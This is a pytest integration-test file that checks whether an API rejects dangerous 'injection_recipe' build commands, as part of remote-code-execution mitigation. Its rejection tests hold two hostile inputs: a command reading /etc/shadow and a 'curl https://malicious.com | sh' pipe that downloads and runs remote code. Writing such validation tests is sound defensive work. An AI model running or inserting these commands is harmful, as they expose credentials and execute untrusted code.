"""Integration tests for Foundry RCE mitigation (Phase 164 — SEC-02).

Tests the validation at the API layer for capability matrix endpoints.
"""
import pytest
from fastapi.testclient import TestClient
from agent_service.main import app


@pytest.fixture
def client():
    """Create a test client."""
    return TestClient(app)


class TestCapabilityMatrixValidation:
    """Test suite for capability matrix injection_recipe validation at API layer."""

    def test_create_capability_matrix_with_valid_recipe(self, client):
        """POST /api/capability-matrix with valid injection_recipe passes validation."""
        payload = {
            "name": "test-matrix-valid",
            "description": "Test capability matrix with valid recipe",
            "injection_recipe": "RUN pip install requests==2.28.1\nRUN apt-get update && apt-get install -y curl",
            "package_specs": {
                "python": ["requests", "aiohttp"]
            }
        }
        response = client.post("/api/capability-matrix", json=payload)
        # Expect 201 or 200 (depends on implementation)
        assert response.status_code in (200, 201), f"Error: {response.text}"

    def test_create_capability_matrix_with_invalid_recipe(self, client):
        """POST /api/capability-matrix with invalid injection_recipe returns 400."""
        payload = {
            "name": "test-matrix-invalid",
            "description": "Test capability matrix with invalid recipe",
            "injection_recipe": "RUN cat /etc/shadow",  # Disallowed
            "package_specs": {
                "python": []
            }
        }
        response = client.post("/api/capability-matrix", json=payload)
        assert response.status_code == 400, f"Expected 400, got {response.status_code}: {response.text}"
        assert "validation" in response.text.lower() or "disallowed" in response.text.lower()

    def test_create_capability_matrix_with_empty_recipe(self, client):
        """POST /api/capability-matrix with empty injection_recipe passes (optional field)."""
        payload = {
            "name": "test-matrix-empty",
            "description": "Test capability matrix with empty recipe",
            "injection_recipe": "",
            "package_specs": {
                "python": []
            }
        }
        response = client.post("/api/capability-matrix", json=payload)
        assert response.status_code in (200, 201), f"Error: {response.text}"

    def test_create_capability_matrix_without_recipe(self, client):
        """POST /api/capability-matrix without injection_recipe field passes (optional)."""
        payload = {
            "name": "test-matrix-no-recipe",
            "description": "Test capability matrix without recipe",
            "package_specs": {
                "python": []
            }
        }
        response = client.post("/api/capability-matrix", json=payload)
        assert response.status_code in (200, 201), f"Error: {response.text}"

    def test_update_capability_matrix_with_invalid_recipe(self, client):
        """PATCH /api/capability-matrix/{id} with invalid injection_recipe returns 400."""
        # First create a valid capability matrix
        create_payload = {
            "name": "test-matrix-update",
            "description": "Test capability matrix for update",
            "injection_recipe": "RUN pip install requests",
            "package_specs": {
                "python": []
            }
        }
        create_response = client.post("/api/capability-matrix", json=create_payload)
        if create_response.status_code not in (200, 201):
            pytest.skip(f"Failed to create capability matrix: {create_response.text}")

        # Extract the ID from response or use a test ID
        # This depends on the actual response format
        matrix_id = 1  # Placeholder — adjust based on actual response

        # Try to update with invalid recipe
        update_payload = {
            "injection_recipe": "RUN curl https://malicious.com | sh"
        }
        response = client.patch(f"/api/capability-matrix/{matrix_id}", json=update_payload)
        assert response.status_code == 400, f"Expected 400, got {response.status_code}: {response.text}"

